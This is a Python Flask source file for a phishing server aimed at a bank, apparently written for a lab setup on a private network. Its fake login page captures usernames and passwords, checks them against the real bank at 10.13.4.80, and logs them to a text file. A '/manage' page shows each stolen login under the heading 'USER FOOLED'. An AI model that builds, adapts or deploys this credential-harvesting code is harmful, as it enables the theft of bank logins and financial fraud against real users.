from flask import Flask, request, render_template,render_template_string, jsonify
import requests

app = Flask(__name__)
bank_url = 'http://10.13.4.80/'
latest_username = None
latest_password = None
Usersfound = None
check = None

@app.route('/collect_credentials', methods=['POST'])
def collect_credentials():
    data = request.get_json()
    username = data.get('username', '')  # Get username or default to empty string if not provided
    password = data.get('password', '')  # Get password or default to empty string if not provided

    # Open the file in append mode
    with open('Logged-Credentials.txt', 'a') as f:
        if username:
            f.write(f'Username: {username}\n')
        if password:
            f.write(f'Password: {password}\n')
        f.write('---\n')  # Separator for each entry

    # Log the collected data for debugging (optional)
    if username:
        print(f'Collected Username: {username}')
    if password:
        print(f'Collected Password: {password}')

    return jsonify({'status': 'success'})


@app.route('/', methods=["GET", "POST"])
def home():
    global latest_username, latest_password,check

    if request.method == 'POST':
        username = request.form.get('username')  
        password = request.form.get('password')
        data = {'username': username,'password': password,'submit': 'submit'}
        customPage = request.form.get('customPage')
        response = requests.post(bank_url, data=data)

        if (customPage == "Custom Page"):
            check = 0
            return render_template("CustomPage")
            
        elif('logout' in response.text):
            requests.post("http://localhost:5000/manage", data=data)
            return response.text
        else:
            if check == None:
                return render_template('HomePage')
            else:
                return render_template('CustomPage')


    if request.method == 'GET':
        return render_template('HomePage')



@app.route('/manage', methods=["GET", "POST"])
def manage():
    global latest_username, latest_password, Usersfound

    html_content = '''
    <html>
        <head>
            <meta http-equiv="refresh" content="5">  <!-- Refresh page every 5 seconds -->
            <title>Auto-refreshing Page</title>
        </head>
        <body>
            <h1> {{ number }} </h1>
        </body>
    </html>
    '''
    if request.method == 'POST':
        latest_username = request.form.get('username')
        latest_password = request.form.get('password')
        Usersfound = 1

    # Generate the number string
    if Usersfound == None:
        number = "NO USERS FOOLED"
    else:
        number = f"USER FOOLED. Username:{latest_username}, Password:{latest_password}"
    # Render the page, it will auto-refresh every 5 seconds
    return render_template_string(html_content, number=number)


if __name__ == '__main__':
    app.run(debug=True)
